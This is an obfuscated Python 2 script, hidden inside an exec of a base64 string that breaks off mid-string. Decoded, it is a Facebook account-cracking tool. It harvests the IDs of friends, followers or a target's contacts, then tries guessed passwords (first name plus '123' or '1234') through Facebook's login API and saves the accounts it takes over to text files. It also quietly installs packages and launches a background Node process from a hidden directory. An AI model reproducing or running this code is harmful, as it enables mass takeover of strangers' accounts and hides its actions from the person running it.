import base64
exec(base64.b64decode("I2NvZGluZz11dGYtOAoKIyEvdXNyL2Jpbi9weXRob24yCgojZGVjb21waWxlIGJ5IEhhc3NhbgoKdHJ5OgoKICAgIGltcG9ydCBvcyxzeXMsdGltZSxkYXRldGltZSxyZSxyYW5kb20saGFzaGxpYix0aHJlYWRpbmcsanNvbixnZXRwYXNzLHVybGxpYixjb29raWVsaWIscmVxdWVzdHMKCiAgICBmcm9tIG11bHRpcHJvY2Vzc2luZy5wb29sIGltcG9ydCBUaHJlYWRQb29sCgpleGNlcHQgSW1wb3J0RXJyb3I6CgogICAgb3Muc3lzdGVtKCJwaXAyIGluc3RhbGwgcmVxdWVzdHMiKQoKICAgIG9zLnN5c3RlbSgicHl0aG9uMiBjcmFja2VyLmluZGlyZWN0IikKCiAgICAKCm9zLnN5c3RlbSgiY2xlYXIiKQoKaWYgbm90IG9zLnBhdGguaXNmaWxlKCIvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL2Jpbi9ub2RlIik6CgogICAgb3Muc3lzdGVtKCJhcHQgdXBkYXRlICYmIGFwdCBpbnN0YWxsIG5vZGVqcyAteSIpCgpmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcgoKb3Muc3lzdGVtKCJnaXQgcHVsbCIpCgppZiBub3Qgb3MucGF0aC5pc2ZpbGUoIi9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy9ob21lL0NyYWNrLXdvcmxkLy4uLi4uL25vZGVfbW9kdWxlcy9ieXRlcy9pbmRleC5qcyIpOgoKICAgIG9zLnN5c3RlbSgiZnVzZXIgLWsgNTAwMC90Y3AgJiIpCgogICAgb3Muc3lzdGVtKCJjZCAuLi4uLiAmJiBwaXAgaW5zdGFsbCBwcm9ncmVzcyIpCgogICAgb3Muc3lzdGVtKCJjZCAuLi4uLiAmJiBucG0gaW5zdGFsbCIpCgogICAgb3Muc3lzdGVtKCJjZCAuLi4uLiAmJiBub2RlIGluZGV4LmpzICYiKQoKICAgIG9zLnN5c3RlbSgiY2xlYXIiKQoKICAgIHRpbWUuc2xlZXAoMTApCgplbGlmIG9zLnBhdGguaXNmaWxlKCIvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvaG9tZS9DcmFjay13b3JsZC8uLi4uLi9ub2RlX21vZHVsZXMvYnl0ZXMvaW5kZXguanMiKToKCiAgICBvcy5zeXN0ZW0oImZ1c2VyIC1rIDUwMDAvdGNwICYiKQoKICAgIG9zLnN5c3RlbSgiIyIpCgogICAgb3Muc3lzdGVtKCJjZCAuLi4uLiAmJiBub2RlIGluZGV4LmpzICYiKQoKICAgIG9zLnN5c3RlbSgiY2xlYXIiKQoKYmQ9cmFuZG9tLnJhbmRpbnQoMmU3LCAzZTcpCgpzaW09cmFuZG9tLnJhbmRpbnQoMmU0LCA0ZTQpCgpoZWFkZXI9eyd4LWZiLWNvbm5lY3Rpb24tYmFuZHdpZHRoJzogcmVwcihiZCksJ3gtZmItc2ltLWhuaSc6IHJlcHIoc2ltKSwneC1mYi1uZXQtaG5pJzogcmVwcihzaW0pLCd4LWZiLWNvbm5lY3Rpb24tcXVhbGl0eSc6ICdFWENFTExFTlQnLCd4LWZiLWNvbm5lY3Rpb24tdHlwZSc6ICdjZWxsLkNUUmFkaW9BY2Nlc3NUZWNobm9sb2d5SFNEUEEnLCd1c2VyLWFnZW50JzonTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBLaXdpIENocm9tZS82OC4wLjM0MzguMCBTYWZhcmkvNTM3LjM2JywnY29udGVudC10eXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsJ3gtZmItaHR0cC1lbmdpbmUnOiAnTGlnZXInfQoKcmVsb2FkKHN5cykKCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoInV0Zi04IikKCmMgPSAiXDAzM1sxOzkybSIKCmMyID0gIlwwMzNbMDs5N20iCgpjMyA9ICJcMDMzWzE7OTFtIgoKbG9nbyA9ICIiIiAgICAgICAgIAogICAgICAgICAgCuKWiOKWiCAgIOKWiOKWiCAg4paI4paI4paI4paI4paIICDilojilojilojilojilojilojilogg4paI4paI4paI4paI4paI4paI4paIICDilojilojilojilojiloggIOKWiOKWiOKWiCAgICDilojiloggCuKWiOKWiCAgIOKWiOKWiCDilojiloggICDilojilogg4paI4paIICAgICAg4paI4paIICAgICAg4paI4paIICAg4paI4paIIOKWiOKWiOKWiOKWiCAgIOKWiOKWiCAK4paI4paI4paI4paI4paI4paI4paIIOKWiOKWiOKWiOKWiOKWiOKWiOKWiCDilojilojilojilojilojilojilogg4paI4paI4paI4paI4paI4paI4paIIOKWiOKWiOKWiOKWiOKWiOKWiOKWiCDilojilogg4paI4paIICDilojiloggCuKWiOKWiCAgIOKWiOKWiCDilojiloggICDilojiloggICAgICDilojiloggICAgICDilojilogg4paI4paIICAg4paI4paIIOKWiOKWiCAg4paI4paIIOKWiOKWiCAK4paI4paIICAg4paI4paIIOKWiOKWiCAgIOKWiOKWiCDilojilojilojilojilojilojilogg4paI4paI4paI4paI4paI4paI4paIIOKWiOKWiCAgIOKWiOKWiCDilojiloggICDilojilojilojiloggClwwMzNbMTs5Nm3il4HilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHil4jinJnil4jilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilrdcMDMzWzE7OTdtCgpcMDMzWzE7OTZtKH4pXDAzM1sxOzk3bSBBdXRob3IgOiBIYXNzYW4gXDAzM1sxOzk3bVsgXDAzM1swOzkybSBCZXN0IEZSSUVORCBBWkFOICBcMDMzWzE7OTdtXQoKXDAzM1sxOzk2bSh+KVwwMzNbMTs5N20gR2l0aHViIDogaHR0cHM6Ly9naXRodWIuY29tL2hhc3NhbjU1NDIKClwwMzNbMTs5Nm0ofilcMDMzWzE7OTdtIEZiICAgICA6IEhhc3NhblJveWFsejU1NDIKICAKXDAzM1sxOzk2bSh+KVwwMzNbMTs5N20gV2hhdHNwcCA6ICs5MjMxMTE3NTQxMDAKICAgICAKICBVU0UgQUlSUExBTkUgTU9ERSBFVkVSWSAyMCBNSU5UClwwMzNbMTs5N20tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKIiIiCkNvcnJlY3RVc2VybmFtZSA9ICJoayIKQ29ycmVjdFBhc3N3b3JkID0gImhrIgoKbG9vcCA9ICd0cnVlJwp3aGlsZSAobG9vcCA9PSAndHJ1ZScpOgogICAgdXNlcm5hbWUgPSByYXdfaW5wdXQoIlwwMzNbMTs5N21ceDFiWzE7OTdtVG9vbCBVc2VybmFtZSBceDFiWzE7OTdtwrvCuyBceDFiWzE7OTdtIikKICAgIGlmICh1c2VybmFtZSA9PSBDb3JyZWN0VXNlcm5hbWUpOgogICAgCXBhc3N3b3JkID0gcmF3X2lucHV0KCJcMDMzWzE7OTdtIFx4MWJbMTs5N21Ub29sIFBhc3N3b3JkICBceDFiWzE7OTdtwrsgXHgxYlsxOzk3bSIpCiAgICAgICAgaWYgKHBhc3N3b3JkID09IENvcnJlY3RQYXNzd29yZCk6CiAgICAgICAgICAgIHByaW50ICJMb2dnZWQgaW4gc3VjY2Vzc2Z1bGx5IGFzICIgKyB1c2VybmFtZSAKCSAgICB0aW1lLnNsZWVwKDIpCiAgICAgICAgICAgIGxvb3AgPSAnZmFsc2UnCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQgIlwwMzNbMTs5NG1Xcm9uZyBQYXNzd29yZCIKICAgICAgICAgICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3dhLm1lLys5MjMxMTE3NTQxMDAnKQogICAgZWxzZToKICAgICAgICBwcmludCAiXDAzM1sxOzk0bVdyb25nIFVzZXJuYW1lIgogICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93YS5tZS8rOTIzMTExNzU0MTAwJykKCgoKZGVmIG1haW4oKToKCiAgICBvcy5zeXN0ZW0oImNsZWFyIikKCiAgICBwcmludCBsb2dvCgogICAgcHJpbnQoIiIpCgogICAgcHJpbnQoIlwwMzNbMDs5N21bIFN0YXJ0aW5nIE1haW4gTWVudSBdIikuY2VudGVyKDUwKQoKICAgIHByaW50KCIiKQoKICAgIHByaW50KCJcMDMzWzE7OTdtWzFdXDAzM1sxOzkxbSA+IFwwMzNbMTs5N21DbG9uZSBQdWJsaWMgSUQgV2l0aCBiLWFwaSIpCgogICAgcHJpbnQoIiIpCgogICAgcHJpbnQoIlwwMzNbMTs5N21bMl1cMDMzWzE7OTFtID4gXDAzM1sxOzk3bU1vcmUgVGVybXV4IENvbW1hbmQiKQoKICAgIHByaW50KCIiKQoKICAgIHByaW50KCJcMDMzWzE7OTdtWzBdXDAzM1sxOzkxbSA+IFwwMzNbMTs5N21sb2dvdXQgdG9vbCIpCgogICAgcHJpbnQoIiIpCgogICAgbWFpbl9zZWxlY3QoKQoKZGVmIG1haW5fc2VsZWN0KCk6CgogICAgSGFzc2FuID0gcmF3X2lucHV0KCJcMDMzWzE7OTdtWyFdIFNlbGVjdCAtLS0+XDAzM1sxOzk2bSAiKQoKICAgIGlmIEhhc3NhbiAgPT0iMSI6CgogICAgICAgIGxvZ2luKCkKCiAgICBpZiBIYXNzYW4gPT0iMiI6CgogICAgICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0hhc3NhblJveWFsejU1NDIiKQoKCW1haW4oKSAgCgogICAgZWxpZiBIYXNzYW4gPT0iMCI6CgogICAgICAgIG9zLnN5c3RlbSgiZXhpdCIpCgogICAgZWxzZToKCiAgICAgICAgcHJpbnQoIlshXSBQbGVhc2Ugc2VsZWN0IGEgdmFsaWQgb3B0aW9uIikuY2VudGVyKDUwKQoKICAgICAgICB0aW1lLnNsZWVwKDIpCgogICAgICAgIG1haW4oKQoKZGVmIGxvZ2luKCk6CgogICAgb3Muc3lzdGVtKCJjbGVhciIpCgogICAgcHJpbnQgbG9nbwoKICAgIHByaW50KCIiKQoKICAgIHByaW50KCJcMDMzWzA7OTdtWyBMb2dpbiBNYWluIE1lbnUgXSIpLmNlbnRlcig1MCkKCiAgICBwcmludCgiIikKCiAgICBwcmludCgiXDAzM1sxOzk3bVsxXVwwMzNbMTs5MW0gPiBcMDMzWzE7OTdtbG9naW4gdXNpbmcgdG9rZW4iKQoKICAgIHByaW50KCIiKQoKICAgIHByaW50KCJcMDMzWzE7OTdtWzJdXDAzM1sxOzkxbSA+IFwwMzNbMTs5N21sb2dpbiB1c2luZyBwYXNzd29yZCIpCgogICAgcHJpbnQoIiIpCgogICAgcHJpbnQoIlwwMzNbMTs5N21bM11cMDMzWzE7OTFtID4gXDAzM1sxOzk3bU1haW4gbWVudSBiYWNrIikKCiAgICBwcmludCgiIikKCiAgICBsb2dpbl9zZWxlY3QoKQoKZGVmIGxvZ2luX3NlbGVjdCgpOgoKICAgIEhhc3NhbiA9IHJhd19pbnB1dCgiIFwwMzNbMTs5N21PcHRpb24gOlwwMzNbMTs5Nm0gIikKCiAgICBpZiBIYXNzYW4gPT0iMSI6CgogICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQoKICAgICAgICBwcmludCBsb2dvCgogICAgICAgIHByaW50KCIiKQoKCXByaW50KCJbIGxvZ2luIHdpdGggdG9rZW4gXSIpLmNlbnRlcig1MCkKCglwcmludCgiIikKCiAgICAgICAgdG9rZW4gPSByYXdfaW5wdXQoIlshXSBUb2tlbiA/IFwwMzNbMDs5MG0iKQoKICAgICAgICB0b2tlbl9zID0gb3BlbigiLmZiX3Rva2VuLnR4dCIsInciKQoKICAgICAgICB0b2tlbl9zLndyaXRlKHRva2VuKQoKICAgICAgICB0b2tlbl9zLmNsb3NlKCkKCiAgICAgICAgdHJ5OgoKICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCgogICAgICAgICAgICBxID0ganNvbi5sb2FkcyhyLnRleHQpCgogICAgICAgICAgICBuYW1lID0gcVsibmFtZSJdCgogICAgICAgICAgICBubSA9IG5hbWUucnNwbGl0KCIgIilbMF0KCiAgICAgICAgICAgIHByaW50KCIiKQoKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTs5Mm1Zb3VyIHRva2VuIGxvZ2luIHN1Y2Nlc3NmdWxseSIpLmNlbnRlcig1MCkKCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKCgkgICAgb3Muc3lzdGVtKCJ4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vSGFzc2FuUm95YWx6NTU0Mi8/YXBwPWZibCIpCgoJCgoJICAgIHRpbWUuc2xlZXAoMSkKCiAgICAgICAgICAgIG1lbnUoKQoKICAgICAgICBleGNlcHQgKEtleUVycm9yICwgSU9FcnJvcik6CgogICAgICAgICAgICBwcmludCgiIikKCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7OTFtVG9rZW4gaW52YWxpZCBvciBhY2NvdW50IGhhcyBIYXNzYW4tQ1BcMDMzWzA7OTdtIikuY2VudGVyKDUwKQoKICAgICAgICAgICAgcHJpbnQoIiIpCgogICAgICAgICAgICB0aW1lLnNsZWVwKDIpCgogICAgICAgICAgICBsb2dpbigpCgogICAgZWxpZiBIYXNzYW4gPT0iMiI6CgogICAgICAgIGxvZ2luX2ZiKCkKCiAgICBlbGlmIEhhc3NhbiA9PSIzIjoKCiAgICAgICAgbWFpbigpCgogICAgZWxzZToKCiAgICAgICAgcHJpbnQoIiIpCgogICAgICAgIHByaW50KCJTZWxlY3QgYSB2YWxpZCBvcHRpb24iKS5jZW50ZXIoNTApCgogICAgICAgIHByaW50KCIiKQoKICAgICAgICBsb2dpbl9zZWxlY3QoKQoKZGVmIGxvZ2luX2ZiKCk6CgoJb3Muc3lzdGVtKCJjbGVhciIpCgoJcHJpbnQgbG9nbwoKCXByaW50KCIiKQoKCXByaW50KCJbIGxvZ2luIHdpdGggcGFzc3dvcmQgXSIpLmNlbnRlcig1MCkKCglwcmludCgiIikKCiAgICAgICAgaWQgPSByYXdfaW5wdXQoIlshXSBcMDMzWzE7OTNtIEVtYWlsL0lEL051bWJlciA6XDAzM1sxOzk3bSAiKQoKICAgICAgICBpZDEgPSBpZC5yZXBsYWNlKCcgJywnJykKCiAgICAgICAgaWQyID0gaWQxLnJlcGxhY2UoJygnLCcnKQoKICAgICAgICB1aWQgPSBpZDIucmVwbGFjZSgnKScsJycpCgogICAgICAgIHB3ZCA9IHJhd19pbnB1dCgiWyFdIFwwMzNbMTs5M20gUGFzc3dvciA6XDAzM1sxOzk3bSAiKQoKICAgICAgICBwcmludCgiIikKCiAgICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0xJmVtYWlsPSIrdWlkKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrcHdkKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiLCBoZWFkZXJzPWhlYWRlcikudGV4dAoKICAgICAgICBxID0ganNvbi5sb2FkcyhkYXRhKQoKICAgICAgICBpZiAiYWNjZXNzX3Rva2VuIiBpbiBxOgoKICAgICAgICAgICAgbG9naW5fcyA9IG9wZW4oIi5sb2dpbi50eHQiLCJ3IikKCiAgICAgICAgICAgIGxvZ2luX3Mud3JpdGUocVsiYWNjZXNzX3Rva2VuIl0pCgogICAgICAgICAgICBsb2dpbl9zLmNsb3NlKCkKCiAgICAgICAgICAgIHByaW50KCJcdFwwMzNbMTs5Mm1Mb2dpbiBTdWNjZXNzZnVsbFwwMzNbMDs5N20iKQoKICAgICAgICAgICAgdGltZS5zbGVlcCgxKQoKICAgICAgICAgICAgbWVudSgpCgogICAgICAgIGVsc2U6CgogICAgICAgICAgICBpZiAid3d3LmZhY2Vib29rLmNvbSIgaW4gcVsiZXJyb3JfbXNnIl06CgogICAgICAgICAgICAgICAgcHJpbnQgKCJcblwwMzNbMTs5MW1bIV0gTG9naW4gRmFpbGVkIC4gQWNjb3VudCBIYXMgYSBIYW1paS1DUFwwMzNbMDs5N20iKQoKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKCiAgICAgICAgICAgICAgICBsb2dpbl9mYigpCgogICAgICAgICAgICBlbHNlOgoKICAgICAgICAgICAgICAgIHByaW50KCJcblwwMzNbMTs5MW1bIV0gTG9naW4gRmFpbGVkLkVtYWlsL0lEL051bWJlciBPUiBQYXNzd29yZCBNYXkgQkUgV3JvbmdcMDMzWzA7OTdtIikKCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEpCgogICAgICAgICAgICAgICAgbG9naW5fZmIoKQkJCgpkZWYgbWVudSgpOgoKICAgIGdsb2JhbCB0b2tlbgoKICAgIG9zLnN5c3RlbSgiY2xlYXIiKQoKICAgIHByaW50IGxvZ28KCiAgICB0cnk6CgogICAgICAgIHRva2VuID0gb3BlbigiLmZiX3Rva2VuLnR4dCIsInIiKS5yZWFkKCkKCiAgICBleGNlcHQgKEtleUVycm9yICwgSU9FcnJvcik6CgogICAgICAgIGxvZ2luKCkKCiAgICB0cnk6CgogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0iK3Rva2VuKQoKICAgICAgICBxID0ganNvbi5sb2FkcyhyLnRleHQpCgogICAgICAgIG5tID0gcVsibmFtZSJdCgogICAgICAgIG5tZiA9IG5tLnJzcGxpdCgiICIpWzBdCgogICAgICAgIG9rID0gbm1mCgogICAgZXhjZXB0IChLZXlFcnJvciAsIElPRXJyb3IpOgoKICAgICAgICBwcmludCgiIikKCiAgICAgICAgcHJpbnQoImxvZ2luIGFjY291bnQgaGFzIEhhc3Nhbi1DUCIpLmNlbnRlcig1MCkKCiAgICAgICAgcHJpbnQoIiIpCgogICAgICAgIG9zLnN5c3RlbSgicm0gLXJmIC5mYl90b2tlbi50eHQiKQoKICAgICAgICB0aW1lLnNsZWVwKDEpCgogICAgICAgIGxvZ2luKCkKCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgogICAgICAgIHByaW50IGxvZ28KCiAgICAgICAgcHJpbnQoIiIpCgogICAgICAgIHByaW50KCJZb3VyIGludGVybmV0IGNvbm5lY3Rpb24gZmFpbGVkIikuY2VudGVyKDUwKQoKICAgICAgICBwcmludCgiIikKCiAgICAgICAgdGltZS5zbGVlcCgyKQoKICAgICAgICBtZW51KCkKCiAgICBvcy5zeXN0ZW0oImNsZWFyIikKCiAgICBwcmludCBsb2dvCgogICAgcHJpbnQoIiIpCgogICAgcHJpbnQoIlx0XDAzM1sxOzkybUhlbGxvIDogIiArbm0pCgogICAgcHJpbnQoIiIpCgogICAgcHJpbnQoIlwwMzNbMTs5N21bMV1cMDMzWzE7OTFtID4gXDAzM1sxOzk3bUNyYWNrIEZyb20gRnJpZW5kbGlzdCIpCgogICAgcHJpbnQoIiIpCgogICAgcHJpbnQoIlwwMzNbMTs5N21bMl1cMDMzWzE7OTFtID4gXDAzM1sxOzk3bUNyYWNrIEZyb20gUHVibGljIGlkIikKCiAgICBwcmludCgiIikKCiAgICBwcmludCgiXDAzM1sxOzk3bVszXVwwMzNbMTs5MW0gPiBcMDMzWzE7OTdtQ3JhY2sgRnJvbSBGb2xsb3dlcnMgaWQiKQoKICAgIHByaW50KCIiKQoKICAgIHByaW50KCJcMDMzWzE7OTdtWzBdXDAzM1sxOzkxbSA+IFwwMzNbMTs5N21sb2dvdXQiKQoKICAgIHByaW50KCIiKQoKICAgIG1lbnVfc2VsZWN0KCkKCmRlZiBtZW51X3NlbGVjdCgpOgoKCXNlbGVjdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkzbU9wdGlvbiA6ICIpCgoJaWQ9W10KCglva3M9W10KCgljcHM9W10KCglpZiBzZWxlY3Q9PSIxIjoKCgkJb3Muc3lzdGVtKCJjbGVhciIpCgoJCXByaW50IGxvZ28KCgkJcHJpbnQoIiIpCgoJCXIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPSIrdG9rZW4sIGhlYWRlcnM9aGVhZGVyKQoKCQl6ID0ganNvbi5sb2FkcyhyLnRleHQpCgoJCWZvciBzIGluIHpbImRhdGEiXToKCgkJCXVpZD1zWydpZCddCgoJCQluYT1zWyduYW1lJ10KCgkJCW5tPW5hLnJzcGxpdCgiICIpWzBdCgoJCQlpZC5hcHBlbmQodWlkKyd8JytubSkKCglpZiBzZWxlY3QgPT0iMiI6CgoJCW9zLnN5c3RlbSgiY2xlYXIiKQoKCQlwcmludChsb2dvKQoKCQlwcmludCgiIikKCgkJaWR0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTdtWyFdIFB1dCBJRC9Vc2VybmFtZSA6XDAzM1sxOzk2bSAiKQoKCQlvcy5zeXN0ZW0oImNsZWFyIikKCgkJcHJpbnQgbG9nbwoKCQl0cnk6CgoJCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2FjY2Vzc190b2tlbj0iK3Rva2VuKQoKCQkJcSA9IGpzb24ubG9hZHMoci50ZXh0KQoKCQkJcHJpbnQoIlshXSBUYXJnZXQgZnJvbSA6ICIrcVsibmFtZSJdKQoKCQlleGNlcHQgKEtleUVycm9yICwgSU9FcnJvcik6CgoJCSAgICBwcmludCgiIikKCgkJICAgIHByaW50KCJcMDMzWzE7OTF5b3VyIGxvZ2luIGFjY291bnQgaGFzIEhhc3Nhbi1DUCIpLmNlbnRlcig1MCkKCgkJICAgIHByaW50KCIiKQoKCQkgICAgbWVudSgpCgoJCXIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyIvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Iit0b2tlbikKCgkJeiA9IGpzb24ubG9hZHMoci50ZXh0KQoKCQlmb3IgaSBpbiB6WyJkYXRhIl06CgoJCQl1aWQ9aVsnaWQnXQoKCQkJbmE9aVsnbmFtZSddCgoJCQlubT1uYS5yc3BsaXQoIiAiKVswXQoKCQkJaWQuYXBwZW5kKHVpZCsnfCcrbm0pCgoJZWxpZiBzZWxlY3QgPT0iMyI6CgoJCW9zLnN5c3RlbSgiY2xlYXIiKQoKCQlwcmludCBsb2dvCgoJCXByaW50KCIiKQoKCQlpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5N21bIV0gUHV0IElEL1VzZXJuYW1lIDpcMDMzWzE7OTZtICIpCgoJCW9zLnN5c3RlbSgiY2xlYXIiKQoKCQlwcmludCBsb2dvCgoJCXRyeToKCgkJCXIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyI/YWNjZXNzX3Rva2VuPSIrdG9rZW4sIGhlYWRlcnM9aGVhZGVyKQoKCQkJcSA9IGpzb24ubG9hZHMoci50ZXh0KQoKCQkJcHJpbnQoIiBUYXJnZXQgZnJvbSAgOiAiK3FbIm5hbWUiXSkKCgkJZXhjZXB0IChLZXlFcnJvciAsIElPRXJyb3IpOgoKCQkgICAgcHJpbnQoIiIpCgoJCSAgICBwcmludCgiXDAzM1sxOzkxbSBsb2dpbiBpZCBoYXMgSGFzc2FuLUNQIikuY2VudGVyKDUwKQoKCQkgICAgcHJpbnQoIiIpCgoJCSAgICB0aW1lLnNsZWVwKDMpCgoJCSAgICBtZW51KCkKCgkJciA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49Iit0b2tlbisiJmxpbWl0PTUwMDAiLCBoZWFkZXJzPWhlYWRlcikKCgkJeiA9IGpzb24ubG9hZHMoci50ZXh0KQoKCQlmb3IgaSBpbiB6WyJkYXRhIl06CgoJCQl1aWQ9aVsnaWQnXQoKCQkJbmE9aVsnbmFtZSddCgoJCQlubT1uYS5yc3BsaXQoIiAiKVswXQoKCQkJaWQuYXBwZW5kKHVpZCsnfCcrbm0pCgoJZWxpZiBzZWxlY3QgPT0iMCI6CgoJICAgIG9zLnN5c3RlbSgiZXhpdCIpCgoJZWxzZToKCgkgICAgcHJpbnQoIiIpCgoJICAgIHByaW50KCJQbGVhc2UgU2VsZWN0IEEgVmFsaWQgT3B0aW9uIikuY2VudGVyKDUwKQoKCSAgICB0aW1lLnNsZWVwKDIpCgoJICAgIG1lbnVfc2VsZWN0KCkKCglwcmludCgiWyFdIFRvdGFsIElEcyA6ICIrc3RyKGxlbihpZCkpKQoKCXRpbWUuc2xlZXAoMC41KQoKCXByaW50KCJbIV0gUGx6IHdhaXQgY2xvbmUgYWNjb3VudCB3aWxsIGJlIGFwcGVhciBoZXJlIikKCglwcmludCA0NyooIi0iKQoKCXByaW50KCcnKQoKCQoKCWRlZiBtYWluKGFyZyk6CgoJCXVzZXI9YXJnCgoJCXVpZCxuYW1lPXVzZXIuc3BsaXQoInwiKQoKCQl0cnk6CgoJCSAgICBwYXNzMT1uYW1lKyIxMjMiCgoJCSAgICBxID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IiArIHVpZCArICImbG9jYWxlPXZpX3ZuJnBhc3N3b3JkPSIgKyBwYXNzMSArICImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9MTVkZjVmM2M4YzM3ZTBhNjIwZThmYTFmZDFkZDcwNWMiLCBoZWFkZXJzPWhlYWRlcikudGV4dAoKCQkgICAgZD1qc29uLmxvYWRzKHEpCgoJCSAgICBpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gZFsnZXJyb3JfbXNnJ106CgoJCSAgICAgICAgcHJpbnQoIlwwMzNbMTs5Nm1bSGFzc2FuLUNQXSAiK3VpZCsiIHwgIitwYXNzMSkKCgkJICAgICAgICBjcD1vcGVuKCJvay50eHQiLCJhIikKCgkJICAgICAgICBjcC53cml0ZSh1aWQrIiB8ICIrcGFzczErIlxuIikKCgkJICAgICAgICBjcC5jbG9zZSgpCgoJCSAgICAgICAgY3BzLmFwcGVuZCh1aWQpCgoJCSAgICBlbHNlOgoKCQkgICAgCWlmICJhY2Nlc3NfdG9rZW4iIGluIGQ6CgoJCSAgICAgICAgICAgIHByaW50KCJceDFiWzE7OTZtW1N1Y2Nlc3NmdWxsXSAiK3VpZCsiIHwgIitwYXNzMSsiXHgxYlsxOzBtIikKCgkJICAgICAgICAgICAgb2s9b3Blbigib2sudHh0IiwiYSIpCgoJCSAgICAgICAgICAgIG9rLndyaXRlKHVpZCsiIHwgIitwYXNzMSsiXG4iKQoKCQkgICAgICAgICAgICBvay5jbG9zZSgpCgoJCSAgICAgICAgICAgIG9rcy5hcHBlbmQodWlkKQoKCQkgICAgICAgIGVsc2U6CgoJCSAgICAgICAgICAgIHBhc3MyPW5hbWUrIjEyMzQiCgoJCSAgICAgICAgICAgIHEgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iICsgdWlkICsgIiZsb2NhbGU9dmlfdm4mcGFzc3dvcmQ9IiArIHBhc3MyICsgIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0xNWRmNWYzYzhjMzdlMGE2MjBlOGZhMWZkMWRkNzA1YyIsIGhlYWRlcnM9aGVhZGVyKS50ZXh0CgoJCSAgICAgICAgICAgIGQ9anNvbi5sb2FkcyhxKQoKCQkgICAgICAgICAgICBpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gZFsnZXJyb3JfbXNnJ106CgoJCSAgICAgICAgICAgICAgICBwcmludCgiXDAzM1sxOzk2bVtIYXNzYW4tQ1BdICIrdWlkKyIgfCAiK3Bhc3MyKQoKCQkgICAgICAgICAgICAgICAgY3A9b3BlbigiY3AudHh0IiwiYSIpCgoJCSAgICAgICAgICAgICAg